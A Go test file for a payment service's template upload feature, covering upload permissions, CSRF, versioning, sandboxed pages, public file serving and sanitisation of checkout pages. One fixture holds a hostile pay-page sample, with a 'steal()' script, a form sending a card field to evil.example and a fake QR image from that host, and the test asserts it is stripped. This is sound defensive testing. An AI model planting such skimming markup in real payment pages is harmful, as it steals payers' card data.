package contract_test

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"image"
	"image/png"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"

	"goepay/internal/compat"
	"goepay/internal/identity"
	"goepay/internal/pagetemplate"
)

func templateZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for name, content := range files {
		w, e := zw.Create(name)
		if e != nil {
			t.Fatal(e)
		}
		w.Write([]byte(content))
	}
	if e := zw.Close(); e != nil {
		t.Fatal(e)
	}
	return b.Bytes()
}

func tinyPNG(t *testing.T) string {
	t.Helper()
	var b bytes.Buffer
	if e := png.Encode(&b, image.NewRGBA(image.Rect(0, 0, 3, 3))); e != nil {
		t.Fatal(e)
	}
	return b.String()
}

var templateFileKey = regexp.MustCompile(`/template-files/([0-9a-f]{32})/`)

// Uploaded templates over HTTP: only the super administrator's own session
// checks and saves packages; every change is a new immutable version under
// the kind's revision; the selected home page runs its scripts in a CSP
// sandbox; package files are public by an unguessable key until the template
// is removed; every upload, restore, removal and selection enqueues exactly
// one administrator notice and nothing financial.
func TestUploadedTemplatesOverHTTPConsoleVersionsPublicFilesAndNotices(t *testing.T) {
	s, p, _ := fixture(t)
	ctx := context.Background()
	admin, csrf, e := s.Sessions.Create(identity.User{Role: "admin", AdminClass: "super", ID: 1, Username: "admin", AuthVersion: 1})
	if e != nil {
		t.Fatal(e)
	}
	operator, operatorCSRF, e := s.Sessions.Create(identity.User{Role: "admin", AdminClass: "operator", ID: 2, Username: "operator", AuthVersion: 1})
	if e != nil {
		t.Fatal(e)
	}
	tls := httptest.NewTLSServer(s.Handler())
	defer tls.Close()
	call := func(method, path, token, cs, contentType string, body []byte, header ...string) (int, http.Header, []byte) {
		t.Helper()
		r, e := http.NewRequest(method, tls.URL+path, bytes.NewReader(body))
		if e != nil {
			t.Fatal(e)
		}
		if token != "" {
			r.AddCookie(&http.Cookie{Name: "goepay_admin", Value: token})
		}
		if cs != "" {
			r.Header.Set("X-CSRF-Token", cs)
		}
		if contentType != "" {
			r.Header.Set("Content-Type", contentType)
		}
		for i := 0; i+1 < len(header); i += 2 {
			r.Header.Set(header[i], header[i+1])
		}
		res, e := tls.Client().Do(r)
		if e != nil {
			t.Fatal(e)
		}
		defer res.Body.Close()
		b, e := io.ReadAll(res.Body)
		if e != nil {
			t.Fatal(e)
		}
		return res.StatusCode, res.Header, b
	}
	upload := func(path, token, cs, revision string, pkg []byte) (int, []byte) {
		t.Helper()
		var form bytes.Buffer
		mp := multipart.NewWriter(&form)
		if revision != "" {
			mp.WriteField("expected_revision", revision)
		}
		part, _ := mp.CreateFormFile("file", "template.zip")
		part.Write(pkg)
		mp.Close()
		code, _, b := call("POST", path, token, cs, mp.FormDataContentType(), form.Bytes())
		return code, b
	}
	jsonCall := func(method, path, body string, want int) []byte {
		t.Helper()
		code, _, b := call(method, path, admin, csrf, "application/json", []byte(body))
		if code != want {
			t.Fatalf("%s %s status %d want %d: %s", method, path, code, want, b)
		}
		return b
	}
	base := "/console/v1/admin/templates/home"
	page := `<!doctype html><html><head><title>{{site_name}}</title><link rel="stylesheet" href="css/site.css"></head><body><a href="#faq">问答</a><img src="images/logo.png" alt="{{brand_name}}"><p id="faq">{{notice}}</p><script src="js/app.js"></script><script>window.inline=1</script></body></html>`
	pkg := templateZip(t, map[string]string{
		"template.json": `{"type":"home","name":"my-home","title":"我的首页","version":"1.0.0"}`,
		"index.html":    page, "css/site.css": `body{background:url(../images/logo.png)}`, "js/app.js": `document.body.dataset.ready="1"`, "images/logo.png": tinyPNG(t),
	})

	// Only the super administrator's own session, and only with CSRF.
	if code, _ := upload(base+"/uploads/check", operator, operatorCSRF, "", pkg); code != 401 && code != 403 {
		t.Fatal("operator checked a package", code)
	}
	if code, _ := upload(base+"/uploads", admin, "", "0", pkg); code != 403 {
		t.Fatal("package saved without CSRF", code)
	}
	code, header, sample := call("GET", base+"/sample", admin, "", "", nil)
	if code != 200 || header.Get("Content-Type") != "application/zip" || !strings.Contains(header.Get("Content-Disposition"), "goepay-home-sample.zip") {
		t.Fatal("sample", code, header)
	}
	if code, b := upload(base+"/uploads/check", admin, csrf, "", sample); code != 200 || !strings.Contains(string(b), `"name":"sample-home"`) || !strings.Contains(string(b), `"identical":false`) {
		t.Fatal("sample check", code, string(b))
	}
	code, b := upload(base+"/uploads", admin, csrf, "0", pkg)
	var saved struct {
		Data pagetemplate.UploadSaved `json:"data"`
	}
	if code != 201 || json.Unmarshal(b, &saved) != nil || saved.Data.Version != 1 || saved.Data.Revision != 1 || !saved.Data.Created || saved.Data.Files != 5 {
		t.Fatal("upload", code, string(b))
	}
	if code, b = upload(base+"/uploads", admin, csrf, "1", pkg); code != 422 || !strings.Contains(string(b), "完全相同") {
		t.Fatal("identical upload", code, string(b))
	}
	if code, _ = upload(base+"/uploads", admin, csrf, "0", pkg); code != 409 {
		t.Fatal("stale revision", code)
	}
	if code, b = upload(base+"/uploads", admin, csrf, "1", bytes.Repeat([]byte("x"), pagetemplate.MaxPackageZip+100)); code != 413 {
		t.Fatal("oversized package", code, string(b))
	}
	if code, b = upload("/console/v1/admin/templates/pay/uploads/check", admin, csrf, "", pkg); code != 422 || !strings.Contains(string(b), "首页模板") {
		t.Fatal("home package on the pay tab", code, string(b))
	}
	list := jsonCall("GET", "/console/v1/admin/templates?type=home", "", 200)
	if !bytes.Contains(list, []byte(`"name":"my-home"`)) || !bytes.Contains(list, []byte(`"source":"upload"`)) || !bytes.Contains(list, []byte(`"source":"builtin"`)) {
		t.Fatal("list", string(list))
	}
	code, header, preview := call("GET", base+"/my-home/preview", admin, "", "", nil)
	csp := header.Get("Content-Security-Policy")
	if code != 200 || !strings.Contains(csp, "sandbox allow-scripts") || strings.Contains(csp, "allow-same-origin") || !strings.Contains(csp, "frame-ancestors 'self'") || !bytes.Contains(preview, []byte(`<a href="/console/v1/admin/templates/home/my-home/preview#faq">`)) {
		t.Fatal("preview", code, csp, string(preview))
	}
	jsonCall("PUT", base+"/selection", `{"expected_revision":"1","name":"my-home"}`, 200)
	code, header, home := call("GET", "/", "", "", "", nil)
	csp = header.Get("Content-Security-Policy")
	m := templateFileKey.FindSubmatch(home)
	if code != 200 || m == nil || header.Get("X-Goepay-Template-Fallback") != "" || !strings.Contains(csp, "sandbox allow-scripts") || strings.Contains(csp, "allow-same-origin") || !strings.Contains(csp, "frame-ancestors 'none'") || !strings.Contains(csp, "form-action 'none'") ||
		!bytes.Contains(home, []byte(`<script src="js/app.js"></script><script>window.inline=1</script>`)) || !bytes.Contains(home, []byte(`<a href="/#faq">`)) || !bytes.Contains(home, []byte(`alt="GOEPAY"`)) {
		t.Fatal("public uploaded home", code, csp, string(home))
	}
	key := string(m[1])
	code, header, script := call("GET", "/template-files/"+key+"/js/app.js?v=3", "", "", "", nil)
	if code != 200 || !strings.HasPrefix(header.Get("Content-Type"), "text/javascript") || header.Get("Access-Control-Allow-Origin") != "*" || !strings.Contains(header.Get("Cache-Control"), "immutable") || header.Get("X-Content-Type-Options") != "nosniff" || !strings.Contains(header.Get("Content-Security-Policy"), "sandbox") || string(script) != `document.body.dataset.ready="1"` {
		t.Fatal("public file", code, header)
	}
	if code, _, _ = call("GET", "/template-files/"+key+"/js/app.js", "", "", "", nil, "If-None-Match", header.Get("ETag")); code != 304 {
		t.Fatal("conditional file request", code)
	}
	// The sandboxed page loads scripts cross-site; a page of this site never runs them.
	if code, _, _ = call("GET", "/template-files/"+key+"/js/app.js", "", "", "", nil, "Sec-Fetch-Site", "cross-site", "Sec-Fetch-Dest", "script"); code != 200 {
		t.Fatal("sandboxed page script load", code)
	}
	for _, dest := range []string{"script", "serviceworker"} {
		if code, _, _ = call("GET", "/template-files/"+key+"/js/app.js", "", "", "", nil, "Sec-Fetch-Site", "same-origin", "Sec-Fetch-Dest", dest); code != 403 {
			t.Fatal("same-origin script load of a template file", dest, code)
		}
	}
	if code, _, _ = call("GET", "/template-files/"+key+"/images/logo.png", "", "", "", nil, "Sec-Fetch-Site", "same-origin", "Sec-Fetch-Dest", "image"); code != 200 {
		t.Fatal("console picture of a template", code)
	}
	for _, path := range []string{"/template-files/" + key + "/index.html", "/template-files/" + key + "/template.json", "/template-files/" + key + "/js/../index.html", "/template-files/" + strings.Repeat("0", 32) + "/js/app.js", "/template-files/" + key, "/template-files/x/js/app.js"} {
		if code, _, _ = call("GET", path, "", "", "", nil); code != 404 {
			t.Fatal("served", path, code)
		}
	}
	if code, _, _ = call("POST", "/template-files/"+key+"/js/app.js", "", "", "", nil); code != 405 {
		t.Fatal("file POST", code)
	}
	code, header, agreement := call("GET", "/agreement.html", "", "", "", nil)
	if code != 200 || strings.Contains(header.Get("Content-Security-Policy"), "sandbox") || strings.Contains(header.Get("Content-Security-Policy"), "script-src") || !bytes.Contains(agreement, []byte(`class="home home-default"`)) {
		t.Fatal("agreement keeps the built-in page", code, header.Get("Content-Security-Policy"))
	}

	// Versions, restore, download, removal.
	second := templateZip(t, map[string]string{
		"template.json": `{"type":"home","name":"my-home","title":"我的首页 2"}`,
		"index.html":    strings.Replace(page, "问答", "常见问题", 1), "css/site.css": `body{color:#123}`, "js/app.js": `1`, "images/logo.png": tinyPNG(t),
	})
	if code, b = upload(base+"/uploads", admin, csrf, "2", second); code != 201 || !strings.Contains(string(b), `"version":2`) || !strings.Contains(string(b), `"selected":true`) {
		t.Fatal("second version", code, string(b))
	}
	if code, _, b = call("GET", base+"/my-home/versions/1/preview", admin, "", "", nil); code != 200 || !bytes.Contains(b, []byte("问答")) {
		t.Fatal("old version preview", code)
	}
	code, header, zipped := call("GET", base+"/my-home/versions/1/package", admin, "", "", nil)
	if code != 200 || !strings.Contains(header.Get("Content-Disposition"), "my-home-v1.zip") {
		t.Fatal("download", code, header)
	}
	if again, e := pagetemplate.ParsePackage("home", zipped); e != nil || len(again.Files) != 5 {
		t.Fatal("downloaded package", e)
	}
	jsonCall("POST", base+"/my-home/versions/1/restore", `{"expected_revision":"2"}`, 409)
	if b = jsonCall("POST", base+"/my-home/versions/1/restore", `{"expected_revision":"3"}`, 200); !bytes.Contains(b, []byte(`"version":3`)) {
		t.Fatal("restore", string(b))
	}
	var versions struct {
		Data struct {
			Items []pagetemplate.UploadVersionItem `json:"items"`
		} `json:"data"`
	}
	if json.Unmarshal(jsonCall("GET", base+"/my-home/versions", "", 200), &versions) != nil || len(versions.Data.Items) != 3 || versions.Data.Items[0].Operation != "restore" || versions.Data.Items[0].RestoredFrom != 1 || versions.Data.Items[1].Title != "我的首页 2" {
		t.Fatal("versions", versions)
	}
	for _, path := range []string{base + "/my-home/versions/0/preview", base + "/my-home/versions/01/package", base + "/my-home/versions/9/preview", base + "/nope/versions", base + "/my-home/nope"} {
		if code, _, _ = call("GET", path, admin, "", "", nil); code != 404 && code != 422 {
			t.Fatal("unknown route", path, code)
		}
	}
	if b = jsonCall("POST", base+"/my-home/remove", `{"expected_revision":"4"}`, 422); !strings.Contains(string(b), "正在使用") {
		t.Fatal("selected template removed", string(b))
	}
	jsonCall("PUT", base+"/selection", `{"expected_revision":"4","name":"default"}`, 200)
	jsonCall("POST", base+"/my-home/remove", `{"expected_revision":"5"}`, 200)
	if code, _, _ = call("GET", "/template-files/"+key+"/js/app.js", "", "", "", nil); code != 404 {
		t.Fatal("removed template files still public", code)
	}
	if code, header, _ = call("GET", "/", "", "", "", nil); strings.Contains(header.Get("Content-Security-Policy"), "sandbox") {
		t.Fatal("built-in home after removal", code)
	}
	// Pay packages never carry scripts.
	payPkg := templateZip(t, map[string]string{"template.json": `{"type":"pay","name":"my-pay","title":"支付"}`, "index.html": `<div>{{content}}</div>`, "js/a.js": "1"})
	if code, b = upload("/console/v1/admin/templates/pay/uploads", admin, csrf, "0", payPkg); code != 422 || !strings.Contains(string(b), "不运行脚本") {
		t.Fatal("pay package with a script", code, string(b))
	}

	// One notice job per event (upload ×2, select, restore, remove), nothing financial.
	var notices, others int
	if e = p.QueryRow(ctx, `SELECT count(*) FILTER (WHERE kind=$1), count(*) FILTER (WHERE kind<>$1) FROM jobs`, pagetemplate.UploadNoticeKind).Scan(&notices, &others); e != nil || notices != 5 || others != 0 {
		t.Fatal("notice jobs", notices, others, e)
	}
	for _, table := range []string{"orders", "ledger_entries"} {
		var n int
		if e = p.QueryRow(ctx, "SELECT count(*) FROM "+table).Scan(&n); e != nil || n != 0 {
			t.Fatal("template upload changed financial table", table, n, e)
		}
	}
	var audit string
	if e = p.QueryRow(ctx, "SELECT coalesce(jsonb_agg(changes)::text,'') FROM backoffice_audit WHERE resource='page-templates' AND operation IN('upload-template','restore-template','remove-template')").Scan(&audit); e != nil || strings.Contains(audit, "window.inline") || strings.Count(audit, `"digest"`) != 3 {
		t.Fatal("audit must record each version without its content", audit, e)
	}
}

// An uploaded pay or qrpay template frames the real checkout and collection
// pages: the system block (amount, order, payment material, forms) sits
// where {{content}} was, the template's markup closes the page after it, its
// scripts never reach the page, and the handler CSP only gains the template's
// own style sheets, fonts and images.
func TestUploadedPayAndCollectionTemplatesFrameRealPages(t *testing.T) {
	s, pool, key, calls := routingHTTPFixture(t)
	ctx := context.Background()
	templates := pagetemplate.New(pool)
	admin := pagetemplate.Actor{Role: "admin", Class: "super", ID: 1, Name: "admin"}
	shell := func(kind, name string) []byte {
		return templateZip(t, map[string]string{
			"template.json": `{"type":"` + kind + `","name":"` + name + `","title":"店铺页"}`,
			"index.html":    `<html><head><link rel="stylesheet" href="css/shop.css"><script>steal()</script></head><body class="shop"><header class="shop-head"><img src="images/logo.png" alt="{{brand_name}}">店铺 {{trade_no}}</header><div class="shop-body">{{content}}</div><footer class="shop-foot">店铺页脚 {{year}}</footer><form action="https://evil.example"><input name="card"></form><img src="https://evil.example/fake-qr.png"></body></html>`,
			"css/shop.css":  `.shop-head{font-weight:700}`, "images/logo.png": tinyPNG(t),
		})
	}
	if _, e := templates.UploadTemplate(ctx, "pay", 0, shell("pay", "shop-pay"), admin); e != nil {
		t.Fatal(e)
	}
	if _, e := templates.Select(ctx, "pay", "shop-pay", 1, admin); e != nil {
		t.Fatal(e)
	}
	out := routingInvoke(t, s, key, 1, "upload-template-order", "Original order", "1.00", compat.Params{"channel_id": "7"})
	trade, link := fmt.Sprint(out["trade_no"]), fmt.Sprint(out["payurl"])
	get := func(path string) *httptest.ResponseRecorder {
		w := httptest.NewRecorder()
		s.Handler().ServeHTTP(w, httptest.NewRequest("GET", path, nil))
		return w
	}
	pageRec := get(link)
	body, csp := pageRec.Body.String(), pageRec.Header().Get("Content-Security-Policy")
	head := strings.Index(body, `<header class="shop-head">`)
	main := strings.Index(body, `<main class="goepay-checkout goepay-checkout-pay">`)
	closeMain := strings.LastIndex(body, `</main>`)
	foot := strings.Index(body, `<footer class="shop-foot">`)
	if pageRec.Code != 200 || head < 0 || main < head || closeMain < main || foot < closeMain || !strings.HasSuffix(body, "</body></html>") ||
		!strings.Contains(body[main:closeMain], trade) || !strings.Contains(body[main:closeMain], "1.00") || !strings.Contains(body[head:main], trade) {
		t.Fatal("pay template does not frame the checkout block", pageRec.Code, body)
	}
	if strings.Contains(body, "steal()") || strings.Contains(body, "evil.example") || strings.Contains(body, `name="card"`) || !strings.Contains(body, `<link rel="stylesheet" href="/template-files/`) {
		t.Fatal("template markup not sanitized", body)
	}
	if !strings.Contains(csp, "script-src 'nonce-") || strings.Contains(csp, "script-src 'self'") || !strings.Contains(csp, "style-src 'unsafe-inline' 'self'") || !strings.Contains(csp, "font-src 'self' data:") || !strings.Contains(csp, "img-src 'self' data:") || !strings.Contains(csp, "frame-ancestors 'none'") {
		t.Fatal("checkout CSP", csp)
	}
	if get("/checkout/"+trade).Code != 403 {
		t.Fatal("an uploaded template bypassed the checkout HMAC")
	}

	if _, e := templates.UploadTemplate(ctx, "qrpay", 0, shell("qrpay", "shop-collect"), admin); e != nil {
		t.Fatal(e)
	}
	if _, e := templates.Select(ctx, "qrpay", "shop-collect", 1, admin); e != nil {
		t.Fatal(e)
	}
	var codeID string
	if e := pool.QueryRow(ctx, `INSERT INTO backoffice_records(resource,owner_id,body)VALUES('collection-codes',1,'{"name":"local","title":"Local collect","enabled":true}')RETURNING id::text`).Scan(&codeID); e != nil {
		t.Fatal(e)
	}
	token, _, e := s.Sessions.Create(identity.User{Role: "merchant", Username: "merchant", ID: 1})
	if e != nil {
		t.Fatal(e)
	}
	r := httptest.NewRequest("GET", "/console/v1/merchant/collection-codes/"+codeID+"/link", nil)
	r.AddCookie(&http.Cookie{Name: "goepay_merchant", Value: token})
	w := httptest.NewRecorder()
	s.Handler().ServeHTTP(w, r)
	var result struct {
		Data struct {
			URL string `json:"url"`
		} `json:"data"`
	}
	if e = json.Unmarshal(w.Body.Bytes(), &result); e != nil || w.Code != 200 {
		t.Fatal(w.Code, e)
	}
	pageRec = get(result.Data.URL)
	body, csp = pageRec.Body.String(), pageRec.Header().Get("Content-Security-Policy")
	main = strings.Index(body, `<main class="goepay-checkout goepay-checkout-qrpay">`)
	form := strings.Index(body, `<form method="post"`)
	closeMain = strings.LastIndex(body, `</main>`)
	foot = strings.Index(body, `<footer class="shop-foot">`)
	if pageRec.Code != 200 || main < 0 || form < main || closeMain < form || foot < closeMain || !strings.HasSuffix(body, "</body></html>") || strings.Contains(body, "steal()") ||
		!strings.Contains(csp, "form-action 'self'") || strings.Contains(csp, "script-src") {
		t.Fatal("qrpay template does not frame the collection form", pageRec.Code, csp, body)
	}
	order, e := s.Store.OrderByTradeNo(ctx, trade)
	if e != nil || order.Amount != 100 || order.Name != "Original order" || len(calls.list(trade)) != 1 {
		t.Fatal("an uploaded template changed the original order or provider I/O", order, e)
	}
}
